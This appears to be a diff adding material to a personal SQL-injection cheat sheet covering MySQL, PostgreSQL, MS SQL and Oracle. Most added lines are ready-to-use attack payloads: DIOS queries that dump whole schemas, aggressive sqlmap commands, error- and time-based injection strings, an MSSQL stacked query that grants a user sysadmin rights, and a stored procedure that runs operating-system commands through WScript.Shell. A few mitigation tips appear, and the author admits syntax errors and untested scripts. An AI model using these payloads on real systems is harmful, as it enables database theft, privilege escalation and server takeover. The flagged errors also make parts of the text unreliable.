@@ -11,6 +11,8 @@ permalink: /infosec/sql-injection.html
 
 <article class="markdown-body" markdown="1">
 
+***THIS ARTICLE MAY CONTAIN syntax inaccuracy, THIS ARTICLE ALSO MUST BE RECONSIDERED AND REORGANIZED***
+
 I collect different types of sqli attacks from the internet.
 
 In this document I am targeting 4 databases: MySQL, PostgreSQL, MS SQL, ORACLE
@@ -23,15 +25,60 @@ In this document I am targeting 4 databases: MySQL, PostgreSQL, MS SQL, ORACLE
 
 ---
 
+Additional SQL-injection technics to be studyed:
+
+* ***DIOS*** - Dump In One Shot
+
+    * [DIOS explained part 1](http://securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html)
+    * [DIOS explained part 2](http://securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-2.html)
+    * [DIOS the SQL Injectors Weapon (Upgraded)](http://www.securityidiots.com/Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html)
+    * [SQLi DIOS](https://forum.antichat.ru/threads/425320/)
+    * [DIOS запросы в SQL инъекциях](https://defcon.ru/web-security/2320/)
+
+    * [Ещё статья про SQL injection](https://codeby.net/forum/threads/laboratorija-testirovanija-na-proniknovenie-test-lab-v-10-za-granju-xakerskix-vozmozhnostej-7.58743/)
+
+    <div class="spoiler">
+    <div class="spoiler-title">
+    <i>Some DIOS examples:</i>
+    </div>
+    <div class="spoiler-text" markdown="1">
+    
+    `(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.schemata)where (@a)in (@a:=concat(@a,schema_name,'<br>'))))a)`
+
+    `concat_ws(0x20,@:=0x0a,(select(1)from(information_schema.columns)where@:=concat_ws(0x20,@,0x3c6c693e,table_name,column_name)),@)`
+
+    `concat_ws(0x20,@:=0x0a,(select(1)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and@:=concat_ws(0x20,@,0x3c6c693e,0x3c666f6e7420636f6c6f723d22726564223e5b,table_schema,0x5d,0x3c666f6e7420636f6c6f723d27677265656e273e5b,table_name,0x5d,0x3c666f6e7420636f6c6f723d27626c7565273e5b,column_name,0x5d)),@)`
+
+    `product_id=50 union select null,null,concat(0x3c2f613e3c2f6c693e3c2f756c3e3c2f6469763e3c6469763e3c666f6e7420636f6c6f723d27677265656e272073697a653d353e5370656369616c20466f7220436f64654279204279204461726b4e6f6465204861636b6572,concat_ws(0x20,@:=0x0a,(select(1)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and@:=concat_ws(0x20,@,0x3c6c693e,0x3c666f6e7420636f6c6f723d22726564223e5b,table_schema,0x5d,0x3c666f6e7420636f6c6f723d27677265656e273e5b,table_name,0x5d,0x3c666f6e7420636f6c6f723d27626c7565273e5b,column_name,0x5d)),@),0x3c212d2d) -- -`
+
+    `product_id=50 union select null,null,concat('</a></li></ul></div><div><font color='green' size=5>HTML TAGS CLOSE HEADER',concat_ws(' ",@:=0x0a,(select(1)from(information_schema.columns)where(table_schema!='information_schema')and@:=concat_ws(' ',@,0x3c6c693e,0x3c666f6e7420636f6c6f723d22726564223e5b,table_schema,0x5d,0x3c666f6e7420636f6c6f723d27677265656e273e5b,table_name,0x5d,0x3c666f6e7420636f6c6f723d27626c7565273e5b,column_name,0x5d)),@)`
+    
+    </div>
+    </div>
+
+
 # SQL-injection Bookmarks
+
+* [SQL cheat sheet](http://www.sql-tutorial.net/SQL-Cheat-Sheet.pdf)
+* [SQL tutorial](http://www.sql-tutorial.net/)
+
+<br>
+
+Do not really rely on automatic tools.
 
 * [Rogue-MySql-Server](https://github.com/allyshka/Rogue-MySql-Server) - MySQL fake server for read files of connected clients
 * [attackercan/cpp-sql-fuzzer](https://github.com/attackercan/CPP-SQL-FUZZER) - tables of allowed symbols in different inputs of SQL expressions
 * [sqlmap](http://sqlmap.org/) - tool that automates the process of detecting and exploiting SQL injection ([Automated Audit using sqlmap](https://www.owasp.org/index.php/Automated_Audit_using_SQLMap))
 
+    `sqlmap.py -r burp-request.txt -p InjectedParameter` - example 2
+
+    `sqlmap "--suffix= --.example.com" -u "https://10.0.0.1/upload/files/asdf" "--host=settings_conf " -p host --dbms PostgreSQL --os Linux --level 5 --risk 3 --banner` - example1
+
+* [mieliekoek.pl](https://packetstormsecurity.com/files/25807/mieliekoek.pl.html) - SQL insertion crawler which tests all forms on a web site for possible SQL insertion problems
+
 Cheatsheets:
 
-* [sql Injection Cheat Sheet (pentestmonkey)](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) - Oracle, MSSQL, MySQL, PostgreSQL, Ingres, DB2, Informix
+* [sql Injection Cheat Sheet (pentestmonkey)](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) + Oracle, MSSQL, MySQL, PostgreSQL, Ingres, DB2, Informix
 * [sql injection knowledge base](http://websec.ca/kb/sql_injection) - Oracle, MSSQL, MySQL
 * {:.dummy} [MySql SQL injection (RDot intro)](https://rdot.org/forum/showthread.php?t=124)
 
@@ -66,7 +113,14 @@ Cheatsheets:
 
         this is a mutated vector called ***error based blind sqli***
 
-- ***double blind sqli (time-based)*** - there is absolutely on other means to destinguish successfull and unsuccessfull query, but you can use `sleep` or `benchmark` or some hard mathematical computation to make successfull query work significantly longer.
+- ***double blind sqli (time-based)*** - there is absolutely no other means to destinguish successfull and unsuccessfull query, but you can use `sleep` or `benchmark` or some hard mathematical computation to make successfull query work significantly longer.
+
+Typical sql-injection workflow:
+
+- detect accessible databases
+- found table names
+- found amount of columns, names and types of columns
+- found contence of tables
 
 SQL injection mitigation:
 
@@ -78,13 +132,9 @@ This mitigation does work if implemented correctly but it is **NOT** correct mit
 - typecast expected integer values
 - escape expected strings with mysql_real_escape_string and embed them with quotes
 
-<!--
+<br>
 
-## Thoughts
-
-1. Any differences in databases syntax or semantics help defining database type.
-
--->
+Any differences in databases syntax or semantics help defining database type.
 
 <br><br>
 
@@ -320,6 +370,10 @@ Handy functions
 
 1. Symbols from range 0x01 to 0x20 are all space equivalent.
 
+1. MSSQL enables to connect to databases inside query:
+
+    `?id=1; select * from OPENRAWSET('SQLOLEDB', '';'user_id';'passwd','waitfor delay "0:0:50"; select 1;');` - just a delay <br>
+    `?id=1; select*from OPENRAWSET('SQLOLEDB','';'user_id';'passwd','exec master..sp_addsrvrolemember "passwd","sysadmin"; select 1');` - add current user to admin group
 
 #### ORACLE
 
@@ -344,6 +398,9 @@ Handy functions
 <!-- ============================================================================================================================================ -->
 
 ### Union SQL injection
+
+Use `UNION ALL` - to be free from DISTINCT
+Use `NULL` - because usually you have no idea about types
 
 #### MySQL
 
@@ -402,7 +459,8 @@ select concat( concat(
 
 - Query example:
 
-    /?param=`1 and (1) = cast (version() as numeric)--`
+    /?param=`1 and (1) = cast (version() as numeric)--` <br>
+    /?param=`1 and (1) = cast (version() as int)--`
 
 #### MS SQL
 
@@ -499,6 +557,9 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
 
         *Does not work with `group_concat` instead of `version`*
 
+    - Convertion errors:
+
+        ``
 
     - `BIGINT UNSIGNED` error. *error length <= 452*
 
@@ -562,6 +623,8 @@ Overal restriction for error length <= 512 *(mysys/my_error.c)*
     - typecast error
 
         `select convert(int, @@version);`
+
+        `?id=1 or 1=convert(int, (USER))--`
 
 
 - Some queries:
@@ -694,6 +757,8 @@ from dual);</pre>
 
 ### Time-delay (double-blind) SQL injection 
 
+sleep or analogue, or heavy queries or analogue
+
 #### MySQL
 
 - `select if(version() like '5%', `**`sleep`**`(10), false);`
@@ -705,8 +770,10 @@ from dual);</pre>
 
 #### MS SQL
 
-- **`waitfor delay`**` 'time_to_pass';`
-- **`waitfor tim`**`e 'time_to_execute';`
+- `?id=1; IF (LEN(USER)=5) WAITFOR DELAY '00:00:10'--`
+
+    - **`waitfor delay`**` 'time_to_pass';`
+    - **`waitfor time`**` 'time_to_execute';`
 
 #### ORACLE
 
@@ -964,6 +1031,33 @@ EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c';</pre>
 
 </div>
 </div>
+
+
+<!-- ============================================================================================================================================ -->
+<!-- ============================================================================================================================================ -->
+<!-- ============================================================================================================================================ -->
+<br><br>
+
+---
+
+# Some big scripts (do not know if they really works)
+
+Create a new stored procedure, called `xp_cmdshell3`:
+
+``` mssql
+CREATE PROCEDURE xp_cmdshell3(@cmd varchar(255), @Wait int = 0) AS--Create WScript.Shell object
+DECLARE @result int, @OLEResult int, @RunResult int
+DECLARE @ShellID int
+EXECUTE @OLEResult = sp_OACreate ‘WScript.Shell’, @ShellID OUT
+IF @OLEResult <> 0 SELECT @result = @OLEResult
+IF @OLEResult <> 0 RAISERROR (‘CreateObject%0X’, 14, 1, @OLEResult)
+EXECUTE @OLEResult = sp_OAMethod @ShellID, ‘Run’, Null, @cmd, 0, @Wait
+IF @OLEResult <> 0 SELECT @result = @OLEResult
+IF @OLEResult <> 0 RAISERROR (‘Run%0X’, 14, 1, @OLEResult)
+--If @OLEResult <> 0 EXEC sp_displayoaerrorinfo @ShellID, @OLEResult
+EXECUTE @OLEResult = sp_OADestroy @ShellID
+return @result
+```
 
 </article>
 
